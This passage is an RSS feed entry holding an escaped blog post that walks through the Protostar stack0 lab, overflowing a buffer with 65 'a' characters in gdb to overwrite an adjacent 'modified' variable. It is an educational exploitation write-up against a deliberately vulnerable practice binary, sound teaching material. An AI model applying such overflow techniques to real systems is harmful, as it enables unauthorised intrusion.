-&lt;p&gt;See the big number of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x61&lt;/code&gt; digits stored in memory? If we’ll take a look at the ASCII chart, we’ll know that it’s the value of the &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; letters, so that what we enetered. On the other hand, we can also see place where there are only &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt; values, which will probably mean that that’s the place where our &lt;code class=&quot;highlighter-rouge&quot;&gt;modified&lt;/code&gt; variable is stored.&lt;/p&gt;
-
-&lt;p&gt;Now we can run this binary once again, but this time with the input consisting of 65 &lt;code class=&quot;highlighter-rouge&quot;&gt;a&lt;/code&gt; letters.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; r    
-The program being debugged has been started already.
-Start it from the beginning? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y or n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
-Starting program: /opt/protostar/bin/stack0
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-
-Breakpoint 1, main &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1, &lt;span class=&quot;nv&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xbffffd64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at stack0/stack0.c:13
-13	stack0/stack0.c: No such file or directory.
-	&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;stack0/stack0.c
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/40x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;
-0xbffffc50:	0xbffffc6c	0x00000001	0xb7fff8f8	0xb7f0186e
-0xbffffc60:	0xb7fd7ff4	0xb7ec6165	0xbffffc78	0x61616161
-0xbffffc70:	0x61616161	0x61616161	0x61616161	0x61616161
-0xbffffc80:	0x61616161	0x61616161	0x61616161	0x61616161
-0xbffffc90:	0x61616161	0x61616161	0x61616161	0x61616161
-0xbffffca0:	0x61616161	0x61616161	0x61616161	0x00000061
-0xbffffcb0:	0x08048450	0x00000000	0xbffffd38	0xb7eadc76
-0xbffffcc0:	0x00000001	0xbffffd64	0xbffffd6c	0xb7fe1848
-0xbffffcd0:	0xbffffd20	0xffffffff	0xb7ffeff4	0x0804824b
-0xbffffce0:	0x00000001	0xbffffd20	0xb7ff0626	0xb7fffab0
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; c
-Continuing.
-you have changed the &lt;span class=&quot;s1&quot;&gt;'modified'&lt;/span&gt; variable
-
-Program exited with code 051.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here we can see that the place where &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt; values were, now is overwritten with single &lt;code class=&quot;highlighter-rouge&quot;&gt;0x61&lt;/code&gt; value, and since that we know it’s modified. Doing this changed the flow of the program, resulting in our success.&lt;/p&gt;
-</description>
-        <pubDate>Sat, 31 Mar 2018 02:00:00 +0200</pubDate>
-        <link>http://localhost:4000/protostar-0/</link>
-        <guid isPermaLink="true">http://localhost:4000/protostar-0/</guid>
       </item>
     
   </channel>
